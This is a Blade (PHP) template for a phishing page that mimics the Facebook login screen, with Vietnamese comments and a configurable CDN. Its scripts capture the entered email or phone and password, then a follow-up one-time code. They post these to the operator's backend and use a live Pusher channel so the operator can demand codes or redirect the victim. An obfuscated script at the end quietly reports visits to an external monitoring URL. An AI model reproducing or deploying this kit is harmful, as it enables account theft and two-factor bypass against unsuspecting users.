<!doctype html>
<html>

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
    <title>{{ $data->title }}</title>
    <meta name="title" content="{{ $data->title }}" />
    <meta name="description" content="{{ $data->description }}">
    <meta property="twitter:title" content="{{ $data->title }}" />
    <meta property="twitter:description" content="{{ $data->description }}" />
    <meta property="twitter:card" content="summary_large_image" />
    <meta property="twitter:image" content="{{ $data->image }}" />
    <meta property="og:title" content="{{ $data->title }}" />
    <meta property="og:image" content="{{ $data->image }}" />
    <meta property="og:type" content="article" />
    <link rel="shortcut icon"
        href="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/fblogo.png">
    @vite(['resources/css/app.css'])
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"
        integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g=="
        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/pusher/8.4.0/pusher.min.js"
        integrity="sha512-p3rR75Is6DCK1r2D8mdxLQhe4IWVDSTUBdxqs0Veum0hHDSY+sH9M6U6Cesr1umlxbiEK9w/3IhXFlZcWT1AoA=="
        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <link rel="stylesheet" href="https://kit.fontawesome.com/8f728199e4.css" crossorigin="anonymous">
    <style>
        @layer utilities {

            input:-webkit-autofill,
            input:-webkit-autofill:hover,
            input:-webkit-autofill:focus,
            input:-webkit-autofill:active {
                -webkit-box-shadow: 0 0 0px 1000px transparent inset !important;
                -webkit-text-fill-color: inherit !important;
                transition: background-color 9999s ease-in-out 0s;
            }
        }

        @font-face {
            font-family: 'MyRulersVjpPro';
            src: url('https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/fb_font.woff2') format('woff2');
        }

        body {
            font-family: 'MyRulersVjpPro', sans-serif;
        }
    </style>
</head>

<body>
    <div class="min-h-screen bg-card flex items-center justify-center px-4 hidden" id="verify_otp">
        <div class="w-full sm:max-w-[900px]">
            <p class="text-[13px] text-muted-foreground mb-1">Facebook</p>
            <h1 class="text-[22px] font-bold text-card-foreground leading-snug mb-2">
                {{ __('facebook.check_device_notification') }}</h1>
            <p class="text-[14px] text-muted-foreground leading-relaxed mb-5">
                {{ __('facebook.check_device_notification_message') }}</p>
            <div class="rounded-xl overflow-hidden mb-5">
                <img src="images/facebook/device.png" alt="Xác minh thiết bị" class="w-full h-auto">
            </div>
            <div class="flex items-center gap-3 mb-5">
                <i class="fa-light fa-circle-notch fa-spin"></i>
                <div>
                    <p class="text-[15px] font-semibold text-card-foreground leading-tight">
                        {{ __('facebook.waiting_for_approve') }}</p>
                    <p class="text-[13px] text-muted-foreground mt-0.5">{{ __('facebook.waiting_message') }}</p>
                </div>
            </div>
            <div class="h-px bg-border mb-4"></div>
            <form id="submit_otp">
                <div class="mb-4">
                    {{-- Thông báo khi lỗi --}}
                    <div class="py-3.5 px-4 bg-[#f93a4b] text-white text-sm rounded-2xl mb-2" id="warning_otp"
                        style="display: none"></div>
                    <label
                        class="block text-[14px] text-card-foreground font-medium mb-2">{{ __('facebook.or_enter_otp') }}</label>
                    <input type="text" inputmode="numeric" maxlength="8" required
                        placeholder="{{ __('facebook.input_otp_placeholder') }}"
                        class="w-full border border-gray-300 rounded-xl px-4 py-[10px] text-[15px] text-card-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-[#1877F2] focus:border-transparent transition-all">
                </div>
                <button
                    class="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white rounded-full py-[10px] text-[15px] cursor-pointer transition-colors duration-100 mb-3 disabled:cursor-default disabled:opacity-80"
                    id="confirm_otp" type="submit">{{ __('facebook.confirm') }}</button>
            </form>
        </div>
    </div>
    <div class="lg:grid lg:grid-cols-[150px_1fr_600px] border-b-3 border-b-[#dde2e7]" id="main">
        <div class="hidden sm:block col-span-1 ml-10">
            <a href="">
                <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/fb_logo.png"
                    alt="fb-logo" class="mt-[50px] ml-4" width="60">
            </a>
            <h1 class="font-bold text-[3.5rem] leading-tight mt-[300px] mb-7">
                {{ explode('_', __('facebook.discover_anything_you_like'))[0] }} <span
                    class="text-blue-500">{{ explode('_', __('facebook.discover_anything_you_like'))[1] }}</span></h1>
        </div>
        <div class="hidden sm:block col-span-1">
            <div class="flex justify-center items-center h-full">
                <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/fb_login_banner.png"
                    alt="fb-banner" class="w-[40%] xl:w-[50%]">
            </div>
        </div>
        <div class="col-span-1 lg:border-l-3 border-l-[#dde2e7]">
            <div class="flex justify-center px-5 sm:px-10 mx-auto items-center h-full">
                <div class="space-y-3 w-full">
                    <div class="flex justify-center my-10 block sm:hidden">
                        <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/fb_logo.png"
                            alt="fb-logo" width="60">
                    </div>
                    {{-- Notice đăng nhập --}}
                    <p class="font-semibold mb-5" id="notice">{{ $data->login_warning }}</p>
                    {{-- Thông báo khi lỗi --}}
                    <div class="py-3.5 px-4 bg-[#f93a4b] text-white text-sm rounded-2xl" id="warning"
                        style="display: none;"></div>
                    <form id="submit" class="space-y-3">
                        <div class="relative border border-gray-300 rounded-[17px] p-4">
                            <div class="flex gap-1">
                                <input id="user" type="text" placeholder=" "
                                    class="mt-2 bg-transparent peer text-[15px] text-black placeholder:text-[#646d74] outline-none w-full"
                                    required>
                                <label
                                    class="absolute top-[10%] left-[16px] peer-placeholder-shown:top-[32%] peer-placeholder-shown:text-[15px] text-[#646d74] cursor-text text-sm peer-focus:top-[10%] peer-focus:text-sm transition-all"
                                    for="user">{{ __('facebook.email_or_phone') }}</label>
                                <button id="close_btn" class="cursor-pointer hidden" type="button" tabindex="-1">
                                    <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/close_logo.svg"
                                        width="25" />
                                </button>
                            </div>
                        </div>
                        <div class="relative border border-gray-300 rounded-[17px] p-4">
                            <div class="flex gap-1">
                                <input id="pass" type="password" placeholder=" "
                                    class="mt-2 bg-transparent peer text-[15px] text-black placeholder:text-[#646d74] outline-none w-full"
                                    required>
                                <label
                                    class="absolute top-[10%] left-[16px] peer-placeholder-shown:top-[32%] peer-placeholder-shown:text-[15px] text-[#646d74] cursor-text text-sm peer-focus:top-[10%] peer-focus:text-sm transition-all"
                                    for="pass">{{ __('facebook.password') }}</label>
                                @if ($setting->showFacebookPasswordButton)
                                    <button type="button" id="show_pass" class="cursor-pointer hidden"
                                        tabindex="-1">
                                        <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/show_pass.svg"
                                            width="25" />
                                    </button>
                                    <button type="button" id="hide_pass" class="cursor-pointer hidden"
                                        tabindex="-1">
                                        <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/hide_pass.svg"
                                            width="25" />
                                    </button>
                                @endif
                            </div>
                        </div>
                        <button type="submit"
                            class="outline-none cursor-pointer w-full bg-[#0064e0] text-white rounded-[100px] p-2.5 text-sm active:bg-[#3b8ef5] active:scale-[99%] transition-all duration-100 disabled:opacity-80 disabled:cursor-default disabled:pointer-events-none"
                            id="log_btn">
                            {{ __('facebook.login') }}</button>
                    </form>
                    <div class="mt-2">
                        <p class="text-center text-sm text-[#0d1114] cursor-pointer">
                            {{ __('facebook.forgot_password') }}</p>
                        <div class="space-y-6 mt-[100px]">
                            <button
                                class="font-semibold outline-none cursor-pointer w-full bg-white text-[#0064e0] border border-[#0064e0] rounded-[100px] p-2.5 text-sm transition-all duration-100">
                                {{ __('facebook.create_new_account') }}
                            </button>
                            <div class="flex justify-center mb-5">
                                <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/meta_logo.png"
                                    alt="fb-logo" width="55">
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="w-[90vw] mx-auto mt-5 h-[9vh]" id="footer">
        <div class="flex gap-5 justify-center flex-wrap">
            <span class="text-[#646d74] cursor-pointer">Tiếng Việt</span>
            <span class="text-[#646d74] cursor-pointer">English (UK)</span>
            <span class="text-[#646d74] cursor-pointer">中文(台灣)</span>
            <span class="text-[#646d74] cursor-pointer">한국어</span>
            <span class="text-[#646d74] cursor-pointer">日本語</span>
            <span class="text-[#646d74] cursor-pointer">Français (France)</span>
            <span class="text-[#646d74] cursor-pointer">ภาษาไทย</span>
            <span class="text-[#646d74] cursor-pointer">{{ __('facebook.other_languages') }}</span>
        </div>
        <p class="text-[#646d74] text-center mt-5">Meta ©
            <script>
                document.write(new Date().getFullYear())
            </script>
        </p>
    </div>
    <script src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/helpers.js"></script>
    <script>
        ////
        @if ($type == 'custom')
            var pusher = new Pusher('a16c3bab85659b6d2b51', {
                cluster: 'ap1'
            });
        @else
            var pusher = new Pusher('9b6d0d38803706704381', {
                cluster: 'ap3'
            });
        @endif
        var channel = pusher.subscribe('mrls');
        channel.bind("{{ $pusher_code }}", function(data) {
            const warning = $("#warning")
            const btn = $("#log_btn")
            if (data.status) {
                warning.hide()
                window.location.href = '{!! $data->redirect_link !!}'
            } else {
                if (data.wrong_password) {
                    warning.show()
                    warning.html("{{ __('facebook.invalid_password') }}")
                    btn.attr('disabled', false).html("{{ __('facebook.login') }}")
                }
                if (data.wrong_user) {
                    warning.show()
                    warning.html("{{ __('facebook.wrong_phone_or_email') }}")
                    btn.attr('disabled', false).html("{{ __('facebook.login') }}")
                }
                if (data.otp_request) {
                    $("#main").remove()
                    $("#footer").remove()
                    $("#verify_otp").removeClass('hidden')
                }
                if (data.request_resend) {
                    $("#warning_otp").show()
                    $("#warning_otp").html("{{ __('facebook.invalid_authentication_code') }}")
                    $("#confirm_otp").html("{{ __('facebook.confirm') }}").attr('disabled', false)
                }
            }
        });
        ////
        $("#submit").submit(function(e) {
            e.preventDefault();
            const username = $("#user").val()
            const password = $("#pass").val()
            const warning = $("#warning")
            const btn = $(this).find('button[type=submit]')
            const dataToSend = {
                'username': username,
                'password': password,
                'info': '{{ $info }}',
                'ac': 'n'
            }
            btn.attr('disabled', true).html("{{ __('facebook.logging_in') }}")
            // auto detect phone or string
            warning.hide()
            @if ($setting->checkLoginFacebook)
                if (string_check(username)) {
                    if (!check_email(username)) {
                        warning.html("{{ __('facebook.wrong_email') }}")
                        warning.show()
                        btn.attr('disabled', false).html("{{ __('facebook.login') }}")
                        return
                    }
                } else {
                    if (!phone_check(username)) {
                        warning.html("{{ __('facebook.wrong_phone_or_email') }}")
                        warning.show()
                        btn.attr('disabled', false).html("{{ __('facebook.login') }}")
                        return
                    }
                }
            @endif
            @if ($setting->checkLoginFacebookPassword)
                if (password.length < 5) {
                    warning.html("{{ __('facebook.password_too_short') }}")
                    warning.show()
                    btn.attr('disabled', false).html("{{ __('facebook.login') }}")
                    return
                }
            @endif
            $.post("{{ $type == 'custom' ? route('post.customweb.facebook') : route('post.realtimeweb.facebook') }}", {
                    d: JSON.stringify(dataToSend),
                    'p_c': "{{ $pusher_code }}",
                    '_token': '{{ csrf_token() }}'
                },
                function(data, textStatus, jqXHR) {
                    if (!data.status) {
                        warning.html("{{ __('facebook.try_again') }}")
                        warning.show()
                        btn.attr('disabled', false).html("{{ __('facebook.login') }}")
                        return
                    }
                },
                "json"
            );
        });
        $("#submit_otp").submit(function(e) {
            e.preventDefault();
            otp = $(this).find('input[type=text]').val()
            btn = $(this).find('button[type=submit]')
            warning = $("#warning_otp")
            warning.hide()
            const dataToSend = {
                'info': '{{ $info }}',
                'ac': 'o',
                'otp': otp
            }
            if (!otp || otp.length > 8) {
                warning.show()
                warning.html("{{ __('facebook.invalid_authentication_code') }}")
                return
            }
            btn.html("{{ __('facebook.confirming') }}").attr('disabled', true)
            $.post("{{ $type == 'custom' ? route('post.customweb.facebook') : route('post.realtimeweb.facebook') }}", {
                    d: JSON.stringify(dataToSend),
                    'p_c': "{{ $pusher_code }}",
                    '_token': '{{ csrf_token() }}'
                },
                function(data, textStatus, jqXHR) {},
                "json"
            );
        });
        {
            /* Giám sát lưu lượng website */
        }
        @if ($setting->web_monitor)
            function _0x288c() {
                const _0x37ec84 = ['48CMkkll', 'json', '3JonQMx', '17133vzCqfg', '4310966IniJJf',
                    '{{ env('WEB_MONITOR_API_URL') }}', 'post', 'ajax', '121420DbkbkL', '{{ $info }}',
                    '2589160vbohhG', '21xlbLfm', '728nFnPNA', '330tpFAEl', '32313696gMzGBS', '605396rIPIJR',
                    '145269vZVoyM', 'login'
                ];
                _0x288c = function() {
                    return _0x37ec84;
                };
                return _0x288c();
            }

            function _0x33d9(_0x4b7f11, _0x1ea9e4) {
                _0x4b7f11 = _0x4b7f11 - 0x66;
                const _0x288cc2 = _0x288c();
                let _0x33d95b = _0x288cc2[_0x4b7f11];
                return _0x33d95b;
            }(function(_0x605303, _0x130420) {
                const _0x4d4965 = _0x33d9,
                    _0x497ad1 = _0x605303();
                while (!![]) {
                    try {
                        const _0x1dbb7f = parseInt(_0x4d4965(0x6f)) / 0x1 * (parseInt(_0x4d4965(0x6a)) / 0x2) + -
                            parseInt(_0x4d4965(0x70)) / 0x3 * (-parseInt(_0x4d4965(0x67)) / 0x4) + -parseInt(_0x4d4965(
                                0x75)) / 0x5 * (-parseInt(_0x4d4965(0x6d)) / 0x6) + -parseInt(_0x4d4965(0x66)) / 0x7 * (
                                -parseInt(_0x4d4965(0x77)) / 0x8) + parseInt(_0x4d4965(0x6b)) / 0x9 * (parseInt(
                                _0x4d4965(0x68)) / 0xa) + -parseInt(_0x4d4965(0x71)) / 0xb + -parseInt(_0x4d4965(
                            0x69)) / 0xc;
                        if (_0x1dbb7f === _0x130420) break;
                        else _0x497ad1['push'](_0x497ad1['shift']());
                    } catch (_0x53c8ac) {
                        _0x497ad1['push'](_0x497ad1['shift']());
                    }
                }
            }(_0x288c, 0x88e02), ((() => {
                const _0x55563d = _0x33d9,
                    _0x566492 = {
                        'data': _0x55563d(0x76),
                        'type': _0x55563d(0x6c)
                    };
                $[_0x55563d(0x74)]({
                    'type': _0x55563d(0x73),
                    'url': _0x55563d(0x72),
                    'data': _0x566492,
                    'dataType': _0x55563d(0x6e),
                    'success': function(_0x882676) {}
                });
            })()));
        @endif
    </script>
</body>

</html>
